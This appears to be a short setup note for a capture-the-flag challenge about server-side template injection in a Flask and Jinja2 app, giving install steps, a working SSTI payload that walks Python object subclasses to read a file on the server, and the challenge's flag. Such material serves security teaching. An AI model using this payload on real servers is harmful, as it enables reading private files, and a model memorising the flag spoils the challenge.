Setup :
pip install flask
pip install jinja2

Make a flag.txt file in /home/hrj/

Run the server
python app.py


Read the file flag in /home/hrj/flag.txt

Payload:
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/hrj/flag.txt').read() }}

flag.txt:
inctfj{$$ti_i$_3@sy_bUT_th3r3_1$_Ch@nce_0f_X$$}


